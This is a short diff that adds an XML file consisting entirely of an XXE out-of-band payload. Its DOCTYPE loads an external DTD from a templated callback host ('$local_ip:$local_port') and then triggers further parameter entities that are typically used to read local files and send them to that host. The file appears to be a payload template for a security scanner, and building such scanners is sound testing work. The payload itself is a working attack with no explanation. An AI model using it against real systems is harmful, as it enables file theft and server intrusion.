@@ -1,0 +1,2 @@
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE xmlrootname [<!ENTITY % aaa SYSTEM "http://$local_ip:$local_port/$random_str/data.dtd">%aaa;%ccc;%ddd;]>
+
